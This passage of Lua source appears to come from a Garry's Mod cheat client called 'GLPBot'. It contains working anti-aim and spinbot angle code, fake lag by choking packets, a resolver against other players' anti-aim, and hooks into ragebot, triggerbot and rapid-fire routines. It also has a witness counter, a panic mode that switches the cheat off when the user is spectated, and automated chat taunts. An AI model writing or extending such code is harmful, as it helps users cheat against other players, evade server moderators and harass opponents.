	local randcoin = gInt("FakeAngles", "FAKEAngles)", "Emotion X-Axis:")
	if(opt == "Emotion") then
	if(math.random(100) < randcoin) then
		ox = RandCoin() * 181
	end
	elseif(opt == "Off") then
        ox = fa.x
	elseif(opt == "Down") then
		if gOption("FakeAngles", "FAKEAngles)", "Y-Axis:") == "Fake-Forwards" or gOption("FakeAngles", "FAKEAngles)", "Y-Axis:") == "Fake-Backwards" or gOption("FakeAngles", "FAKEAngles)", "Y-Axis:") == "Fake-Sideways" or gOption("FakeAngles", "FAKEAngles)", "Y-Axis:") == "Spinbot" then
			ox = 120 + math.sin(CurTime()*10)*5
		else
			ox = 89
		end
	elseif (opt == "Up") then
		if gOption("FakeAngles", "FAKEAngles)", "Y-Axis:") == "Fake-Forwards" or gOption("FakeAngles", "FAKEAngles)", "Y-Axis:") == "Fake-Backwards" or gOption("FakeAngles", "FAKEAngles)", "Y-Axis:") == "Fake-Sideways" or gOption("FakeAngles", "FAKEAngles)", "Y-Axis:") == "Spinbot" then
			ox = - 120 - math.sin(CurTime()*10)*5
		else
			ox = - 89
		end
	elseif(opt == "Center") then
		if gOption("FakeAngles", "FAKEAngles)", "Y-Axis:") == "Fake-Forwards" or gOption("FakeAngles", "FAKEAngles)", "Y-Axis:") == "Fake-Backwards" or gOption("FakeAngles", "FAKEAngles)", "Y-Axis:") == "Fake-Sideways" or gOption("FakeAngles", "FAKEAngles)", "Y-Axis:") == "Spinbot" then
			ox = 169 + math.sin(CurTime()*3)*5
		else
			ox = 0
		end
	elseif(opt == "Jitter") then
		ox = math.random( - 89, 89)
	elseif(opt == "Fake-Down") then
		ox = 540.000005
	elseif(opt == "Fake-Up") then
		ox = - 540.000005
	elseif(opt == "Semi-Jitter Down") then
		ox = math.random(0, 89)
	elseif(opt == "Semi-Jitter Up") then
		ox = math.random(0, - 89)
	elseif opt == "Spinbot" then
		ox = math.sin(CurTime()*gInt("FakeAngles", "FAKEAngles)", "Spinbot Speed:")/8)*60
	end
end

local function GetY()
    local left = gOption("FakeAngles", "FAKEAngles)", "Anti-Aim Direction:") == "Left"
    local right = gOption("FakeAngles", "FAKEAngles)", "Anti-Aim Direction:") == "Right"
	local randcoin = gInt("FakeAngles", "FAKEAngles)", "Emotion Y-Axis:")
	local opt = gOption("FakeAngles", "FAKEAngles)", "Y-Axis:")
	local adapt = gConn("FakeAngles", "FAKEAngles)", "Adaptive")
	local static = gConn("FakeAngles", "FAKEAngles)", "Static")
	if(opt == "Off") then
        oy = fa.y
	elseif(opt == "Emotion") then
	if(math.random(100) < randcoin) then
		oy = fa.y + math.random( - 180, 180)
	end
	elseif(opt == "Forwards" && !adapt && !static) then
		oy = fa.y
	elseif(opt == "Forwards" && adapt && !static) then
		oy = GetClosest()
	elseif(opt == "Forwards" && static) then
		oy = 180
	elseif(opt == "Backwards" && !adapt && !static) then
		oy = fa.y - 180
	elseif(opt == "Backwards" && adapt && !static) then
		oy = GetClosest() - 180
	elseif(opt == "Backwards" && static) then
		oy = 0
	elseif(opt == "Jitter" && !adapt && !static) then
		oy = fa.y + math.random( - 90, 90)
	elseif(opt == "Jitter" && adapt && !static) then
		oy = GetClosest() + math.random( - 90, 90)
	elseif(opt == "Jitter" && static) then
		oy = 180 + math.random( - 90, 90)
	elseif(opt == "Backwards Jitter" && !adapt && !static) then
		oy = fa.y - 180 + math.random( - 90, 90)
	elseif(opt == "Backwards Jitter" && adapt && !static) then
		oy = GetClosest() - 180 + math.random( - 90, 90)
	elseif(opt == "Backwards Jitter" && static) then
		oy = 0 + math.random( - 90, 90)
	elseif(opt == "Side Switch") then
		oy = math.random( - 631, 631)
	elseif(opt == "Semi-Jitter" && !adapt && !static) then
		oy = fa.y + math.random (25, - 25)
	elseif(opt == "Semi-Jitter" && adapt && !static) then
		oy = GetClosest() + math.random (25, - 25)
	elseif(opt == "Semi-Jitter" && static) then
		oy = 180 + math.random (25, - 25)
	elseif(opt == "Backwards Semi-Jitter" && !adapt && !static) then
		oy = fa.y - 180 + math.random (25, - 25)
	elseif(opt == "Backwards Semi-Jitter" && adapt && !static) then
		oy = GetClosest() - 180 + math.random (25, - 25)
	elseif(opt == "Backwards Semi-Jitter" && static) then
		oy = 0 + math.random (25, - 25)
	elseif(opt == "Spinbot") then
		if left then
        oy = (GLPBot.CurTime() * gInt("FakeAngles", "FAKEAngles)", "Spinbot Speed:")*23) % 350, 1
   		elseif right then
        oy = (GLPBot.CurTime() * - gInt("FakeAngles", "FAKEAngles)", "Spinbot Speed:")*23) % 350, 1
		elseif manual then
		oy = (GLPBot.CurTime() * - gInt("FakeAngles", "FAKEAngles)", "Spinbot Speed:")*23) % 350, 1
		else
		oy = (GLPBot.CurTime() * gInt("FakeAngles", "FAKEAngles)", "Spinbot Speed:")*23) % 350, 1
	    end
	elseif(opt == "Sideways" && !adapt && !static) then
		if right then
		oy = fa.y - 90
		elseif left then
		oy = fa.y + 90
		elseif manual then
		oy = fa.y - 90
		else
		oy = fa.y + 90
	end
	elseif(opt == "Sideways" && adapt && !static) then
		if right then
		oy = GetClosest() - 90
		elseif left then
		oy = GetClosest() + 90
		elseif manual then
		oy = GetClosest() - 90
		else
		oy = GetClosest() + 90
	end
	elseif(opt == "Sideways" && static) then
		if right then
		oy = 90
		elseif left then
		oy = 270
		elseif manual then
		oy = 90
		else
		oy = 270
	end
	elseif(opt == "Sideways Semi-Jitter" && !adapt && !static) then
        if left then
        oy = fa.y + 90 + math.random(0, 40)
        elseif right then
        oy = fa.y + 270 + math.random(0, - 40)
		elseif manual then
		oy = fa.y + 270 + math.random(0, - 40)
		else
		oy = fa.y + 90 + math.random(0, 40) 
        end
	elseif(opt == "Sideways Semi-Jitter" && adapt && !static) then
        if left then
        oy = GetClosest() + 90 + math.random(0, 40)
        elseif right then
        oy = GetClosest() + 270 + math.random(0, - 40)
		elseif manual then
		oy = GetClosest() + 270 + math.random(0, - 40)
		else
		oy = GetClosest() + 90 + math.random(0, 40) 
        end
	elseif(opt == "Sideways Semi-Jitter" && static) then
        if left then
        oy = 270 + math.random(0, 40)
        elseif right then
        oy = 90 + math.random(0, - 40)
		elseif manual then
		oy = 90 + math.random(0, - 40)
		else
		oy = 270 + math.random(0, 40)
        end
	elseif(opt == "Sideways Jitter" && !adapt && !static) then
		if left then
        oy = fa.y + math.random(1, 180, 1, 80, 1)
   		elseif right then
        oy = fa.y + math.random(181, 361) 
		elseif manual then
		oy = fa.y + math.random(181, 361)
		else
		oy = fa.y + math.random(1, 180, 1, 80, 1)
	    end
	elseif(opt == "Sideways Jitter" && adapt && !static) then
		if left then
        oy = GetClosest() + math.random(1, 180, 1, 80, 1)
   		elseif right then
        oy = GetClosest() + math.random(181, 361) 
		elseif manual then
		oy = GetClosest() + math.random(181, 361)
		else
		oy = GetClosest() + math.random(1, 180, 1, 80, 1)
	    end
	elseif(opt == "Sideways Jitter" && static) then
		if left then
        oy = 270 + math.random( - 90, 90)
   		elseif right then
        oy = 90 + math.random( - 90, 90) 
		elseif manual then
		oy = 90 + math.random( - 90, 90)
		else
		oy = 270 + math.random( - 90, 90)
	    end
	elseif(opt == "Fake-Forwards" && !adapt && !static) then
		if left then
        oy = fa.y - math.sin(CurTime()*10)*5
        elseif right then
        oy = fa.y + math.sin(CurTime()*10)*5
		elseif manual then
		oy = fa.y + math.sin(CurTime()*10)*5
		else
		oy = fa.y - math.sin(CurTime()*10)*5
        end
	elseif(opt == "Fake-Forwards" && adapt && !static) then
        if left then
        oy = GetClosest() - math.sin(CurTime()*10)*5
        elseif right then
        oy = GetClosest() + math.sin(CurTime()*10)*5
		elseif manual then
		oy = GetClosest() + math.sin(CurTime()*10)*5
		else
		oy = GetClosest() - math.sin(CurTime()*10)*5
        end
	elseif(opt == "Fake-Forwards" && static) then
        if left then
        oy = 180 - math.sin(CurTime()*10)*5
        elseif right then
        oy = 180 + math.sin(CurTime()*10)*5
		elseif manual then
		oy = 180 + math.sin(CurTime()*10)*5
		else
		oy = 180 - math.sin(CurTime()*10)*5
        end
	elseif(opt == "Fake-Backwards" && !adapt && !static) then
		if right then
		oy = fa.y + 180 + math.sin(CurTime()*10)*5
		elseif left then
		oy = fa.y + 180 - math.sin(CurTime()*10)*5
		elseif manual then
		oy = fa.y + 180 + math.sin(CurTime()*10)*5
		else
		oy = fa.y + 180 - math.sin(CurTime()*10)*5
		end
	elseif(opt == "Fake-Backwards" && adapt && !static) then
		if right then
		oy = GetClosest() + 180 + math.sin(CurTime()*10)*5
		elseif left then
		oy = GetClosest() + 180 - math.sin(CurTime()*10)*5
		elseif manual then
		oy = GetClosest() + 180 + math.sin(CurTime()*10)*5
		else
		oy = GetClosest() + 180 - math.sin(CurTime()*10)*5
		end
	elseif(opt == "Fake-Backwards" && static) then
		if right then
		oy = 0 + math.sin(CurTime()*10)*5
		elseif left then
		oy = 0 - math.sin(CurTime()*10)*5
		elseif manual then
		oy = 0 + math.sin(CurTime()*10)*5
		else
		oy = 0 - math.sin(CurTime()*10)*5
		end
	elseif(opt == "Fake-Sideways" && !adapt && !static) then
		if left then
        oy = fa.y + 90 + math.sin(CurTime()*10)*5
   		elseif right then
        oy = fa.y - 90 - math.sin(CurTime()*10)*5
		elseif manual then
		oy = fa.y - 90 - math.sin(CurTime()*10)*5
		else
		oy = fa.y + 90 + math.sin(CurTime()*10)*5
	    end
	elseif(opt == "Fake-Sideways" && adapt && !static) then
		if left then
        oy = GetClosest() + 90 + math.sin(CurTime()*10)*5
   		elseif right then
        oy = GetClosest() - 90 - math.sin(CurTime()*10)*5
		elseif manual then
		oy = GetClosest() - 90 - math.sin(CurTime()*10)*5
		else
		oy = GetClosest() + 90 + math.sin(CurTime()*10)*5
	    end
	elseif(opt == "Fake-Sideways" && static) then
		if left then
        oy = 270 + math.sin(CurTime()*10)*5
   		elseif right then
        oy = - 270 - math.sin(CurTime()*10)*5
		elseif manual then
		oy = - 270 - math.sin(CurTime()*10)*5
		else
		oy = 270 + math.sin(CurTime()*10)*5
	    
	    end
	end
end

local function WallDetect()
	if (gConn("FakeAngles", "FAKEAngles)", "Wall Detect")) then
		local eye = em.EyePos(me)
		local tr = util.TraceLine({
		start = eye, 
		endpos = (eye + (am.Forward(fa) * 10)), 
		mask = MASK_ALL, 
	})
	if(tr.Hit) then
		ox = - 181
		oy = - 90
		end
	end
end

local function AntiAim(pCmd)
	for k, v in pairs(player.GetAll()) do
	if(gConn("Aimbot", "WeaponJacker", "Panic Mode") && gOption("Aimbot", "WeaponJacker", "Mode:") == "Disable All" && IsValid(v:GetObserverTarget()) and v:GetObserverTarget() == me || gConn("Aimbot", "WeaponJacker", "Panic Mode") && gOption("Aimbot", "WeaponJacker", "Mode:") == "Disable Anti-Aim" && IsValid(v:GetObserverTarget()) and v:GetObserverTarget() == me) then return end
	end
	local wep = pm.GetActiveWeapon(me)
	if(gConn("FakeAngles", "FAKEAngles)", "Disable in Noclip") && em.GetMoveType(me) == MOVETYPE_NOCLIP || me:Team() == TEAM_SPECTATOR || (cm.CommandNumber(pCmd) == 0 && !gConn("Extra", "Extra", "Thirdperson")) || cm.KeyDown(pCmd, 1) || gConn("Extra", "ViewModel", "Enabled") && gConn("ESP", "Extra", "Free Camera") && CamKeyCheck() && !gConn("Extra", "Extra", "Thirdperson") || me:WaterLevel() > 1 || cm.KeyDown(pCmd, 32) && gConn("FakeAngles", "FAKEAngles)", "Disable with 'E' Key") || em.GetMoveType(me) == MOVETYPE_LADDER || aa || me:Health() < 1 || !me:Alive() || !gConn("FakeAngles", "FAKEAngles)", "Enabled") || gConn("Aimbot", "Legitbot", "Enabled") && !gConn("Aimbot", "Legitbot", "Silent (For Anti-Aim)") || gConn("Utilities", "Utilities", "TTT: Prop Kill") && wep:IsValid() && wep:GetClass() == "weapon_zm_carry" && GLPBot.engine.ActiveGamemode() == "terrortown") then return end
	if gOption("FakeAngles", "FAKEAngles)", "Anti-Aim Direction:") == "Manual Switching" then
	if SwitchKeyCheck() and not manualpressed then
	manualpressed = true
	manual = not manual
	elseif not SwitchKeyCheck() and manualpressed then
	manualpressed = false
	end	
	end
	GetX()
	GetY()
	ViewLock()
	WallDetect()
	local aaang = Angle(ox, oy, 0)
	cm.SetViewAngles(pCmd, aaang)
	FixMovement(pCmd, true)
end

local faketick = 0

local function FakeLag(pCmd, Choke, Send)
	if not gConn("FakeAngles", "Fake Lag", "Enabled") then return end
	if gConn("FakeAngles", "Fake Lag", "Disable on Attack") and me:KeyDown(IN_ATTACK) then
		return
	end
	if pCmd:CommandNumber() == 0 then
		return true
	end
	if not Choke then
		choke = gInt("FakeAngles", "Fake Lag", "Lag Factor:") + 0.7
	end
	if not Send then
		send = 0
	end
	faketick = faketick + 1
	if faketick > (choke + send) then
		faketick = 0
	end
	if not (send >= faketick) then
		bSendPacket = false
	end
		flsend = send
	return true
end

local function GetAngle(ang)
	if not NoPhys() and not NoCam() then
		if(not gConn("Aimbot", "WeaponJacker", "No Recoil")) then 
			return ang + pm.GetPunchAngle(me)
		else
			return ang
		end
	end
end

local prop_val = 0

local prop_delay = 0

local function PropKill(pCmd)
	if (cm.CommandNumber(pCmd) == 0 && !gConn("Extra", "Extra", "Thirdperson")) then
		return
	elseif (cm.CommandNumber(pCmd) == 0 && gConn("Extra", "Extra", "Thirdperson")) then
		return
	end
	if PropKeyCheck() then
		ox = fa.x - 27
		if prop_val < 180 then
			oy = fa.y + prop_val
			prop_val = prop_val + 3
		else
			oy = fa.y + 180
		end
		local aaang = Angle(ox, oy, 0)
		cm.SetViewAngles(pCmd, aaang)
		FixMovement(pCmd, true)
	else
		if prop_val > 0 then
			prop_val = 0
			prop_delay = CurTime() + 0.5
		end
		if prop_delay >= CurTime() then
			ox = - 17
			oy = fa.y
			local aaang = Angle(ox, oy, 0)
			cm.SetViewAngles(pCmd, aaang)
			FixMovement(pCmd, true)
		else
			prop_delay = 0
		end
	end
end

local function AutoStop(pCmd)
	if(gConn("Triggerbot", "Triggerbot", "Trigger-Key:") == "None") then return end
		if(gConn("Aimbot", "Ragebot", "Enabled") && gConn("Aimbot", "Ragebot", "Auto Stop") && aimtarget && AimKeyCheck() && WeaponCanFire() or gConn("Aimbot", "Legitbot", "Enabled") && gConn("Aimbot", "Legitbot", "Auto Stop") && aimtarget && AimKeyCheck() && WeaponCanFire() or gConn("Triggerbot", "Triggerbot", "Enabled") && gConn("Triggerbot", "Triggerbot", "Auto Stop") && TriggerKeyCheck() && GLPBot.Triggering && WeaponCanFire()) then
			pCmd:SetForwardMove(0)
			pCmd:SetSideMove(0)
			pCmd:SetUpMove(0)
		return
	end
end

local function AutoCrouch(pCmd)
	if(gConn("Triggerbot", "Triggerbot", "Trigger-Key:") == "None") then return end		
		if(gConn("Aimbot", "Ragebot", "Enabled") && gConn("Aimbot", "Ragebot", "Auto Crouch") && aimtarget && AimKeyCheck() && WeaponCanFire() or gConn("Aimbot", "Legitbot", "Enabled") && gConn("Aimbot", "Legitbot", "Auto Crouch") && aimtarget && AimKeyCheck() && WeaponCanFire() or gConn("Triggerbot", "Triggerbot", "Enabled") && gConn("Triggerbot", "Triggerbot", "Auto Crouch") && TriggerKeyCheck() && GLPBot.Triggering && WeaponCanFire()) then
			pCmd:SetButtons(pCmd:GetButtons() + IN_DUCK)
		return
	end
end

local function FakeAngs(pCmd)
	if(!fa) then 
		fa = cm.GetViewAngles(pCmd)
	end
    fa = fa + Angle(cm.GetMouseY(pCmd) * .023, cm.GetMouseX(pCmd) * - .023, 0)
    NormalizeAngle(fa)
    if(cm.CommandNumber(pCmd) == 0) then
		if not NoPhys() and not NoCam() then
			cm.SetViewAngles(pCmd, GetAngle(fa))
			return
		end
	end
	if(cm.KeyDown(pCmd, 1)) then
		if not NoPhys() and not NoCam() then
			local ang = GetAngle(vm.Angle(PredictSpread(pCmd, fa)))
			NormalizeAngle(ang)
			cm.SetViewAngles(pCmd, ang)
		end
    end
end

local CS = {}

CS.CircleStrafeVal = 0

CS._G = (_G)

CS.localply = CS._G.LocalPlayer()

CS.cl_forwardspeed_cvar = CS._G.GetConVar("cl_forwardspeed")

CS.cl_forwardspeed_value = 10000

if (CS.cl_forwardspeed_cvar) then
	CS.cl_forwardspeed_value = CS.cl_forwardspeed_cvar:GetFloat()
end

CS.cl_sidFakeAngleseed_cvar = CS._G.GetConVar("cl_sidFakeAngleseed")

CS.cl_sidFakeAngleseed_value = 10000

if (CS.cl_sidFakeAngleseed_cvar) then
	CS.cl_sidFakeAngleseed_value = CS.cl_sidFakeAngleseed_cvar:GetFloat()
end

function CS.ClampMove(pCmd)
	if (pCmd:GetForwardMove() > CS.cl_forwardspeed_value) then
		pCmd:SetForwardMove(CS.cl_forwardspeed_value)
	end
	if (pCmd:GetSideMove() > CS.cl_sidFakeAngleseed_value) then
		pCmd:SetSideMove(CS.cl_sidFakeAngleseed_value)
	end
end

function CS.FixMove(pCmd, rotation)
	local rot_cos = CS._G.math.cos(rotation)
	local rot_sin = CS._G.math.sin(rotation)
	local cur_forwardmove = pCmd:GetForwardMove()
	local cur_sidemove = pCmd:GetSideMove()
	pCmd:SetForwardMove(((rot_cos * cur_forwardmove) - (rot_sin * cur_sidemove)))
	pCmd:SetSideMove(((rot_sin * cur_forwardmove) + (rot_cos * cur_sidemove)))
end

function CS.CircleStrafe(pCmd)
	CS.CircleStrafFakeAngleseed = gInt("Extra", "Movement", "Strafe Speed:")
		if (CS._G.input.IsMouseDown(109)) then
			CS.CircleStrafeVal = CS.CircleStrafeVal + CS.CircleStrafFakeAngleseed
		if ((CS.CircleStrafeVal > 10000000) and ((CS.CircleStrafeVal / CS.CircleStrafFakeAngleseed) > 100000)) then
			CS.CircleStrafeVal = 100000000
		end
		CS.FixMove(pCmd, CS._G.math.rad((CS.CircleStrafeVal - CS._G.engine.TickInterval())))
		return false
	else
		CS.CircleStrafeVal = 0
	end
	return true
end

local crouched = 0

local function FakeCrouch(pCmd)
	if gConn("Extra", "Movement", "Fake Crouch") then
	if em.GetMoveType(me) == MOVETYPE_NOCLIP then return end
	if me:Team() == TEAM_SPECTATOR then return end
	if not me:Alive() or me:Health() < 1 then return end
	if LocalPlayer():IsFlagSet(1024) then return end
		if me:KeyDown(IN_DUCK) then
			if crouched <= 5 then
				pCmd:SetButtons(pCmd:GetButtons() + IN_DUCK)
			elseif crouched >= 25 then
				crouched = 0
			end
			crouched = crouched + 1
		else
			if crouched <= 5 then
				pCmd:SetButtons(pCmd:GetButtons() + IN_DUCK)
			elseif crouched >= 12.5 then
				crouched = 0
			end
			crouched = crouched + 1
		end
	end
end

local function CircleStrafe(pCmd)
	if(gConn("Extra", "Movement", "Circle Strafe")) then
	if(gConn("Extra", "Movement", "Auto Strafe")) then return end
	if(gConn("Extra", "ViewModel", "Enabled") && gConn("ESP", "Extra", "Free Camera") && CamKeyCheck() && !gConn("Extra", "Extra", "Thirdperson")) then return end
	if em.GetMoveType(me) == MOVETYPE_NOCLIP then return end
	if me:Team() == TEAM_SPECTATOR then return end
	if not me:Alive() or me:Health() < 1 then return end
	if LocalPlayer():IsFlagSet(1024) then return end
		if (CS.localply) then
			if (pCmd:KeyDown(IN_JUMP)) then
				local local_velocity = CS.localply:GetVelocity()
				if (local_velocity:Length2D() < 50) then
					pCmd:SetForwardMove(CS.cl_forwardspeed_value)
				end
				local shouldautostrafe = CS.CircleStrafe(pCmd)		
				if (!CS.localply:OnGround()) then
					if (shouldautostrafe) then
					end
					pCmd:SetButtons(pCmd:GetButtons() - IN_JUMP)
				end
			else
				CS.CircleStrafeVal = 1
			end
		end
		CS.ClampMove(pCmd)
	end
end

hook.Add("CreateMove", "Hook17", function(pCmd)
	bSendPacket = true
	if gInt("FakeAngles", "Fake Lag", "Lag Factor:") ~= 0 then
	FakeLag(pCmd)
	end
	AntiAFK(pCmd)
	BunnyHop(pCmd)
	FakeAngs(pCmd)
	AutoReload(pCmd)
	Ragebot(pCmd)
	Legitbot(pCmd)
	AntiAim(pCmd)
	RapidFire(pCmd)
	RapidAltFire(pCmd)
	CircleStrafe(pCmd)
	AutoStop(pCmd)
	AutoCrouch(pCmd)
	FakeCrouch(pCmd)
	GLPBot.AirCrouch(pCmd)
	GLPBot.Triggerbot(pCmd)
	GLPBot.FreeCamMove(pCmd)
	if gui.IsGameUIVisible() then return end
	if gui.IsConsoleVisible() then return end
	if me:IsTyping() then return end
	if menuopen then return end
	if me:Team() == TEAM_SPECTATOR then return end
	if not me:Alive() or me:Health() < 1 then return end
	local wep = pm.GetActiveWeapon(me)
	if GLPBot.engine.ActiveGamemode() == "terrortown" and gConn("Utilities", "Utilities", "TTT: Prop Kill") and wep:IsValid() and wep:GetClass() == "weapon_zm_carry" then
		PropKill(pCmd)
	end
end)

hook.Add("AdjustMouseSensitivity", "Hook18", function()
	if not gConn("Triggerbot", "Triggerbot", "Smooth Aim") then return end
	if not TriggerKeyCheck() then return end
	if not GLPBot.Triggering then return end
	if NoPhys() then return end
	if NoCam() then return end
	return .10
end)

hook.Add("ShouldDrawLocalPlayer", "Hook19", function()
	return(gConn("Extra", "Extra", "Thirdperson"))
end)

hook.Add("CalcView", "Hook20", function(me, pos, ang, fov)
	if me:Alive() and me:Health() > 0 and me:Team() ~= TEAM_SPECTATOR then
		if gConn("Extra", "ViewModel", "Enabled") and not gConn("Extra", "Extra", "Thirdperson") then
			local view = {}
			view.origin = pos
			view.angles = angles
			view.fov = gInt("Extra", "ViewModel", "FoV:")
		if (ply:Health() > 0 and ply:GetMoveType() ~= 10 and ply:GetObserverTarget() == nil) then
			if (gConn("Aimbot", "WeaponJacker", "No Recoil")) then
				view.origin = ply:EyePos()
				view.angles = ply:EyeAngles()
			end
		end
		if (FreeCam and gConn("Extra", "ViewModel", "Enabled") and gConn("ESP", "Extra", "Free Camera") and CamKeyCheck() and not gConn("Extra", "Extra", "Thirdperson") and not menuopen and not me:IsTyping() and not gui.IsGameUIVisible() and not gui.IsConsoleVisible() and not (IsValid(g_SpawnMenu) && g_SpawnMenu:IsVisible()) and not (me:Team() == TEAM_SPECTATOR) and not (me:Health() < 1) and not (me:Alive())) then
			view.origin = CamPos
			view.angles = ply:EyeAngles()
			view.fov = gInt("Extra", "ViewModel", "FoV:")
		end
			return view
		else
			local view = {
			angles = GetAngle(fa), 
			origin = (gConn("Extra", "Extra", "Thirdperson") and pos + am.Forward(fa) * (gInt("Extra", "Extra", "Thirdperson Distance:") * - 10) or pos), 
			}
		return view
		end
	end
end)

hook.Add("player_disconnect", "Hook21", function()
	if(gConn("Extra", "Chat", "Enable Spams") && gOption("Extra", "Chat", "Reply Spam:") == "Disconnect Spam") then
		local quit = {"rage quit", "rage quit lol", "he raged", "he raged lmao", "he left", "he left lmfao"}
		if (engine.ActiveGamemode() == "darkrp") then
			me:ConCommand("say /ooc "..quit[math.random(#quit)])
		else
			me:ConCommand("say "..quit[math.random(#quit)])
		end
	end
end)

hook.Add("HUDPaint", "Hook22", function()
	if gInt("Home", "Others", "BG Darkness:") > 0 and menuopen then
		surface.SetDrawColor(0, 0, 0, gInt("Home", "Others", "BG Darkness:")*10)
		surface.DrawRect(0, 0, ScrW(), ScrH())
	end
	if gui.IsGameUIVisible() then return end
	if gui.IsConsoleVisible() then return end
	if (IsValid(g_SpawnMenu) && g_SpawnMenu:IsVisible()) then return end
	if me:Team() == TEAM_SPECTATOR then return end
	if not me:Alive() or me:Health() < 1 then return end
	if (v == me and not em.IsValid(v)) then return end
	local Cap = math.cos(math.rad(45))
	local Offset = Vector(0, 0, 32)
	local Trace = {}
	local WitnessColor = Color (0, 0, 0)
	if (gConn("ESP", "Extra", "Witness Finder")) then
		local Time = os.time() - 1
		local Witnesses = 0
		local BeingWitnessed = true
		if Time < os.time() then
			Time = os.time() + .5
			Witnesses = 0
			BeingWitnessed = false
				for k, pla in pairs(player.GetAll()) do
					if pla:IsValid() and pla != LocalPlayer() then
						Trace.start  = LocalPlayer():EyePos() + Offset
						Trace.endpos = pla:EyePos() + Offset
						Trace.filter = {pla, LocalPlayer()}
						TraceRes = util.TraceLine(Trace)
						if !TraceRes.Hit then
							if (pla:EyeAngles():Forward():Dot((LocalPlayer():EyePos() - pla:EyePos())) > Cap) then
								Witnesses = Witnesses + 1
								BeingWitnessed = true
							end
						end
					end
				end
			end
			if BeingWitnessed == false then
				WitnessColor = Color (gInt("Home", "Menu Text Color", "Red:"), gInt("Home", "Menu Text Color", "Green:"), gInt("Home", "Menu Text Color", "Blue:"))
			else
				WitnessColor = Color (255, 0, 0)
			end
    	draw.SimpleText(Witnesses.." Player(s) can see you.", "MiscFont3", (ScrW() / 2) - 65, 42, Color(gInt("Home", "Main Text Color", "Red:"), gInt("Home", "Main Text Color", "Green:"), gInt("Home", "Main Text Color", "Blue:")), 4, 1, 1, Color(0, 0, 0))
    	surface.SetDrawColor(WitnessColor)
    	surface.DrawRect((ScrW() / 2) - 73, 55, 152, 5)
    end
	if menuopen then return end
	if gConn("ESP", "Extra", "BackCamera") then
		local CamData = {}
			CamData.angles = Angle(fa.p - fa.p - fa.p, fa.y - 180, fa.r)
			CamData.origin = ply:GetShootPos()
			CamData.x = 650
			CamData.y = 0
			CamData.w = ScrW() / 3
			CamData.h = ScrH() / 5
		render.RenderView(CamData)
	end
	if gConn("Utilities", "Utilities", "TTT: Prop Kill") && PropKeyCheck() then
		if prop_val >= 180 then
			surface.DrawCircle(ScrW()/2, ScrH()/1.8, 80 + me:GetVelocity():Length()/4, Color(255, 0, 0))
		else
			surface.DrawCircle(ScrW()/2, ScrH()/1.8, 80 + me:GetVelocity():Length()/4, Color(gInt("Home", "Crosshair Color", "Red:"), gInt("Home", "Crosshair Color", "Green:"), gInt("Home", "Crosshair Color", "Blue:"), gInt("Home", "Others", "T Opacity:")))
		end
	end

	if menuopen then return end
	if gConn("ESP", "Extra", "BackCamera2") then
		local CamData = {}
			CamData.angles = Angle(fa.p - fa.p - fa.p, fa.y - 180, fa.r)
			CamData.origin = ply:GetShootPos()
			CamData.x = 300
			CamData.y = 0
			CamData.w = ScrW() / 4
			CamData.h = ScrH() / 5
		render.RenderView(CamData)
	end
	if gConn("Utilities", "Utilities", "TTT: Prop Kill") && PropKeyCheck() then
		if prop_val >= 180 then
			surface.DrawCircle(ScrW()/2, ScrH()/1.8, 80 + me:GetVelocity():Length()/4, Color(255, 0, 0))
		else
			surface.DrawCircle(ScrW()/2, ScrH()/1.8, 80 + me:GetVelocity():Length()/4, Color(gInt("Home", "Crosshair Color", "Red:"), gInt("Home", "Crosshair Color", "Green:"), gInt("Home", "Crosshair Color", "Blue:"), gInt("Home", "Others", "T Opacity:")))
		end
	end
end)

hook.Add("PreDrawOpaqueRenderables", "Hook23", function()
	if gConn("FakeAngles", "Resolver", "Enabled") then
		for k, v in next, player.GetAll() do
			if v == me or not v:IsValid() or table.HasValue(ignore_list, v:UniqueID()) then continue end
			if gConn("FakeAngles", "Resolver", "Priority Targets Only") then
				if not table.HasValue(priority_list, v:UniqueID()) then continue end
			end
			local pitch = v:EyeAngles().x
			local yaw = v:EyeAngles().y
			local roll = 0
			if gOption("FakeAngles", "Resolver", "X-Axis:") ~= "Off" then
				if gOption("FakeAngles", "Resolver", "X-Axis:") == "Down" then
					pitch = 90
				elseif gOption("FakeAngles", "Resolver", "X-Axis:") == "Up" then
					pitch = - 90
				elseif gOption("FakeAngles", "Resolver", "X-Axis:") == "Center" then
					pitch = 0
				elseif gOption("FakeAngles", "Resolver", "X-Axis:") == "Invert" then
					pitch = - pitch
				elseif gOption("FakeAngles", "Resolver", "X-Axis:") == "Random" then
					pitch = math.random( - 90, 90)
				else
					if pitch <= 20 and pitch >= - 10 then
						pitch = 90
					end
				end
			end
			if gOption("FakeAngles", "Resolver", "Y-Axis:") ~= "Off" then
				if gOption("FakeAngles", "Resolver", "Y-Axis:") == "Left" then
					yaw = yaw + 90
				elseif gOption("FakeAngles", "Resolver", "Y-Axis:") == "Right" then
					yaw = yaw - 90
				elseif gOption("FakeAngles", "Resolver", "Y-Axis:") == "Invert" then
					yaw = yaw + 180
				elseif gOption("FakeAngles", "Resolver", "Y-Axis:") == "Random" then
					yaw = math.random( - 180, 180)
				else
					roll = v:EyeAngles().z
				end
			end
			v:SetPoseParameter("aim_pitch", math.NormalizeAngle(pitch))
			v:SetPoseParameter("head_pitch", math.NormalizeAngle(pitch))
			v:SetPoseParameter("body_yaw", 0)
			v:SetPoseParameter("aim_yaw", 0)
			v:SetRenderAngles(Angle(0, math.NormalizeAngle(yaw) + math.NormalizeAngle(roll), 0))
			v:InvalidateBoneCache()
		end
	end
end)

local randomrFakeAnglesonse = {
	"HA", 
	"GET OWNED?", 
	"HA", 
	"HA", 
	"HA", 
	"HA", 
	"Wanna see some Tricks", 
	"HA", 
	"HA", 
	"HA", 
	"You ever seen Cheats?", 
	"You like donuts dont ya?", 
}

hook.Add("OnPlayerChat", "Hook24", function(v, text, team)
	if v == me or not v:IsValid() or table.HasValue(ignore_list, v:UniqueID()) then
		return false
	end
	if gConn("Extra", "Chat", "Enable Spams") and gOption("Extra", "Chat", "Reply Spam:") == "Cheater Callout" and player ~= me and pm.GetFriendStatus(v) ~= "friend" then
